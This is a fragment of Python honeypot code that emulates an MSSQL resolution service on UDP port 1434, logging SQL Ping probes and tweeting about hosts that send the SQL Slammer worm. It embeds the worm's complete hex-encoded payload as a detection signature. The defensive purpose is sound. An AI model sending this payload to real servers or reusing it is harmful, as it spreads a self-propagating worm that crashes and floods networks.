SQLPing = binascii.unhexlify('02')
SQLSlammer = binascii.unhexlify('\
04010101010101010101010101010101010101010101010101010101010101010101010101010101\
01010101010101010101010101010101010101010101010101010101010101010101010101010101\
0101010101010101010101010101010101dcc9b042eb0e0101010101010170ae420170ae42909090\
909090909068dcc9b042b80101010131c9b11850e2fd35010101055089e551682e646c6c68656c33\
32686b65726e51686f756e746869636b43684765745466b96c6c516833322e64687773325f66b965\
745168736f636b66b9746f516873656e64be1810ae428d45d450ff16508d45e0508d45f050ff1650\
be1010ae428b1e8b033d558bec517405be1c10ae42ff16ffd031c951515081f10301049b81f10101\
0101518d45cc508b45c050ff166a116a026a02ffd0508d45c4508b45c050ff1689c609db81f33c61\
d9ff8b45b48d0c408d1488c1e20401c2c1e20829c28d049001d88945b46a108d45b05031c9516681\
f17801518d4503508b45ac50ffd6ebca')

class udp1434(DatagramProtocol):
	global SQLPing
	global SQLSlammer
	def datagramReceived(self, data, (host, port)):
		global lastSQLSlammer
		global gi
		if data == SQLPing:
			logprint('[HoneyPotTransport.MSSQL,%s:%s] SQL Ping' % (host, port))
			self.transport.write('ServerName;FUCKOFFASSHOLE;InstanceName;MSSQLSERVER;IsClustered;No;Version;8.00.194;tcp;1433;np;\\FUCKOFFASSHOLE\pipe\sql\query;;',(host,port))
		elif ((len(data) == len(SQLSlammer)) & (data == SQLSlammer)):
			logprint('[HoneyPotTransport.MSSQL,%s:%s] SQLSlammer Party' % (host, port))
			if(lastSQLSlammer != host):
				lastSQLSlammer = host
				thread.start_new_thread(twitter_it, ('A host at %s (%s, %s - %s) requested that my honeypot join their SQLSlammer party... #netmenaces', lastSQLSlammer))
		else:
			logprint("UDPData from: %s (%d/UDP):\n%s" % (host, port, binascii.hexlify(data)))

reactor.listenUDP(1434, udp1434(), interface = interface)
